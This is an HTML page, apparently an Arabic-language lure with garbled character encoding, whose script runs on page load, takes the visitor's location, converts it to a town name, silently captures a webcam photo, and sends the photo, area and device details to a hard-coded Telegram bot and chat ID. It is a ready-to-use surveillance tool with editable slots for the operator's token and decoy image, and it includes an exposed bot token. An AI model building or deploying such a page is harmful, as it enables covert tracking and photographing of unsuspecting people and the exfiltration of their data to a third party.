<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>ุฌุงุฑู ุงููุนุงูุฌุฉ</title>
<style>
body {
  font-family: Arial;
  text-align: center;
  margin-top: 40px;
}
img {
  width: 220px;
  margin: 20px auto;
  display: block;
}
</style>
</head>
<body>

<h3>๐ธ ุณูุชู ุงูุชูุงุท ุตูุฑุฉ ูุงุญุฏุฉ</h3>
<p>ูุน ุชุญุฏูุฏ ูููุนู (ุงุณู ุงูููุทูุฉ) ูุฅุฑุณุงููุง.</p>

<!-- ๐ฝ ุถุน ุฑุงุจุท ุงูุตูุฑุฉ ููุง -->
<img src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0" alt="ุตูุฑุฉ">

<canvas id="canvas" style="display:none;"></canvas>

<script>
/* ๐ง ุนุฏูู ููุง */
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
const CHAT_ID  = "6251932709";

window.onload = async () => {
  try {
    // ๐ ุงูุญุตูู ุนูู ุงููููุน
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // ๐ ุชุญููู ุงูุฅุญุฏุงุซูุงุช ุฅูู ุงุณู ููุทูุฉ (ูุฏููุฉ/ููุงูุฉ)
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
      );
      const geoData = await geoRes.json();
      const area =
        geoData.address.city ||
        geoData.address.town ||
        geoData.address.village ||
        geoData.address.state ||
        "ุบูุฑ ูุนุฑูู";

      // ๐ธ ุงูุชูุงุท ุตูุฑุฉ ูุงุญุฏุฉ ุจุฏูู ูุนุงููุฉ
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const imageBase64 = canvas.toDataURL("image/png");
      stream.getTracks().forEach(t => t.stop());

      const device = navigator.userAgent;

      const text = `
๐ธ ุตูุฑุฉ ุฌุฏูุฏุฉ
๐ ุงูููุทูุฉ: ${area}
๐ฑ ุงูุฌูุงุฒ: ${device}
      `;

      // ๐ฉ ุฅุฑุณุงู ุงููุต
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text
        })
      });

      // ๐ท ุฅุฑุณุงู ุงูุตูุฑุฉ
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: imageBase64
        })
      });

    }, () => {
      alert("โ ุชู ุฑูุถ ุงููููุน");
    });

  } catch (e) {
    alert("โ ุญุฏุซ ุฎุทุฃ");
  }
};
</script>

</body>
</html>